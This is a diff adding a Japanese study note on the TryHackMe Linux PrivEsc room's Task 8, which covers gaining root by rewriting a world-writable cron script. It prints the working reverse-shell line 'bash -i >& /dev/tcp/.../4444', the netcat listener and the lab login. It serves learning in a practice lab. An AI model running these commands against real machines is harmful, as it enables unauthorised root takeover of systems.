@@ -2,7 +2,7 @@
 
 > **ルーム:** [Linux PrivEsc](https://tryhackme.com/room/linprivesc)
 > **学習日:** 2026-05-24 〜
-> **進捗:** Task 1〜7 完了（33%）
+> **進捗:** Task 1〜8 完了（38%）
 > **初期認証情報:** `user:password321`（SSH接続可）
 
 ---
@@ -458,9 +458,134 @@ LD_PRELOAD で rootシェルに入った後、`exit` せずにそのまま LD_LI
 
 ---
 
+## Task 8: Cron Jobs - File Permissions
+
+### 概要
+
+root権限で定期実行されるCronジョブのスクリプトが **world-writable（誰でも書き換え可能）** になっている設定ミスを悪用する。  
+スクリプトを「リバースシェル」に書き換え、次のCron発動時にターゲット自身に攻撃者マシンへ接続させて root シェルを奪取する。
+
+### 脆弱性の根源（2つの設定ミスの連鎖）
+
+```
+┌─────────────────────────────────────────┐
+│              設定ミス①                   │
+│  /etc/crontab                           │
+│  * * * * * root overwrite.sh   ←毎分    │
+│              ↑                          │
+│           root権限で自動実行             │
+└────────────────┬────────────────────────┘
+                 │
+                 ▼
+┌─────────────────────────────────────────┐
+│              設定ミス②                   │
+│  /usr/local/bin/overwrite.sh            │
+│  -rwxr--rw-  ← world-writable!         │
+│                                         │
+│  一般ユーザーが内容を書き換え可能        │
+└─────────────────────────────────────────┘
+```
+
+「毎分 root が実行するスクリプト」を「誰でも書き換えられる」状態に置いている。これが今回の致命的な組み合わせ。
+
+### 攻撃フロー（リバースシェル）
+
+```
+【AttackBox】                        【ターゲット Debian VM】
+root@ip-ATTACKER                     user@debian
+      │                                    │
+      │  ① crontab・スクリプト権限を確認    │
+      │◄───────────────────────────────────│
+      │                                    │
+      │  ② overwrite.sh をリバースシェルに書き換え
+      │                                    │
+      │  ③ nc -nvlp 4444 で待ち受け開始    │
+      │  ┌─────────────────┐              │
+      │  │ Listening 4444  │              │
+      │  └─────────────────┘              │
+      │                                    │
+      │         ④ Cron が発動（毎分）       │
+      │         root が overwrite.sh を実行 │
+      │                                    │
+      │◄═══════════════════════════════════│
+      │    ターゲットから接続が届く！        │
+      │   （アウトバウンド通信でFWを突破）   │
+      │                                    │
+      │  ⑤ root@debian:~# が出現           │
+      │     → システム掌握完了             │
+```
+
+### なぜリバースシェルがバインドシェルより強いか
+
+| 手法 | 接続方向 | ファイアウォール突破 |
+|-----|---------|-----------------|
+| **バインドシェル** | 攻撃者 → ターゲット（インバウンド） | 弾かれる（企業FWは外部からの接続を遮断） |
+| **リバースシェル** | ターゲット → 攻撃者（アウトバウンド） | 通過する（Web通信と同じ方向のため許可されやすい） |
+
+ターゲット自身に内側から鍵を開けさせ、攻撃者の元へ root シェルを「献上」させる。
+
+### 手順
+
+```bash
+# ターゲットマシン（user@debian）上で実行
+
+# 1. Cronジョブの偵察
+cat /etc/crontab
+# → * * * * * root overwrite.sh（毎分 root 実行）を確認
+
+# 2. スクリプトの書き込み権限を確認
+ls -l /usr/local/bin/overwrite.sh
+# → -rwxr--rw-（world-writable）を確認
+
+# 3. スクリプトをリバースシェルに書き換え（IP は AttackBox の IP に変更）
+echo '#!/bin/bash' > /usr/local/bin/overwrite.sh
+echo 'bash -i >& /dev/tcp/[AttackBoxのIP]/4444 0>&1' >> /usr/local/bin/overwrite.sh
+```
+
+```bash
+# AttackBox（root@ip-ATTACKER）上で実行
+
+# 4. リスナーを起動して Cron の発動を待つ（最大1分）
+nc -nvlp 4444
+# → Connection received on [ターゲットIP]...
+#    bash: no job control in this shell
+#    root@debian:~#  ← rootシェル奪取成功
+```
+
+### クリーンアップ（後始末）
+
+奪取後のクリーンアップは必須。バックドアを放置すると以下のリスクがある。
+
+| リスク | 内容 |
+|-------|-----|
+| 継続的な検知ノイズ | 毎分 AttackBox の IP に不正接続を試み続ける → SOC に即検知 |
+| 第三者へのバックドア提供 | world-writable のまま放置すると別の攻撃者がIPを書き換えて横取り可能 |
+
+```bash
+# AttackBox 側の netcat セッションで
+exit
+# → root@ip-ATTACKER に戻る
+
+# ターゲットマシン（user@debian）側でペイロードを消去
+echo "" > /usr/local/bin/overwrite.sh
+cat /usr/local/bin/overwrite.sh  # 空になったことを確認
+```
+
+### まとめ：攻撃フェーズの整理
+
+| フェーズ | 実施内容 |
+|---------|---------|
+| **偵察** | `/etc/crontab` でCronスケジュールと対象スクリプトを特定 |
+| **武器化** | `overwrite.sh` をリバースシェルのペイロードに上書き |
+| **待機** | AttackBox で `nc -nvlp 4444` を起動してトリガーを待つ |
+| **掌握** | Cron発動 → ターゲットが自発的に接続 → root シェル奪取 |
+| **後始末** | セッションを切断し、ペイロードを無力化して痕跡を消去 |
+
+---
+
 ## 次回の予定
 
-Task 8: Cron Jobs - File Permissions から再開
+Task 9: Cron Jobs - PATH Environment Variable から再開
 
 ---
 
